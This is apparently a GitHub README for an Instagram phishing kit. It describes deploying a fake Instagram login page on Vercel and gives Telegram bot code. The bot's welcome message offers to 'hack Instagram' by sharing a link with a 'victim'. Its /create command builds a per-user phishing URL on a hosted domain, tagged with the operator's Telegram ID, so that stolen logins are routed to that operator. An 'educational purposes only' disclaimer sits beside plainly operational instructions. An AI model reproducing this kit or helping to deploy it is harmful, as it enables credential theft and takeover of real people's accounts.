# Instagram Hack Phishing

This repository teaches how to create a fake phishing page for Instagram and demonstrates how accounts can be compromised. This project is for **educational purposes only** and should not be used for malicious activities.

## Tutorial

Watch the tutorial video on how to set up and use this phishing page:  
[Watch the Tutorial](https://youtu.be/KMc9ldEFGW0?si=reVy66_ow6NJWiZA)

## Websites Used in this Tutorial

1. [Vercel](https://vercel.com/) – To deploy your phishing page.
2. [GitHub](https://github.com/) – For hosting the code repository.

# Bot Setup Commands

## Bot Making Tutorial 
[HOW TO MAKE TELEGRAM BOT](https://youtube.com/shorts/kGYjTGGwbAk?si=OSSbngPnH-frDYQV)

 
### `/start`
Displays the welcome message and basic usage instructions for the bot.

```javascript
Bot.sendMessage("WELCOME YOU CAN USE THIS BOT FOR HACK INSTAGRAM ACCORDING BY JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 \n 1.Send  /create command\n2.Now just share you generated url to victim.");
```

### `/create`
Generates a personalized URL containing the user's Telegram ID.

```javascript
let userId = user.telegramid;
let url = "https://sg-internet.vercel.app/?id=" + userId;
Bot.sendMessage("YOUR URL:\n" + url + "\n\nMADE BY <b>@SG_Modder</b>", { parse_mode: "HTML" });
```

## Credits

Created by @SG_Modder

## Security Considerations

- Only for personal Use, Don't make public bot otherwise you bot can be easily hack by hackers. 
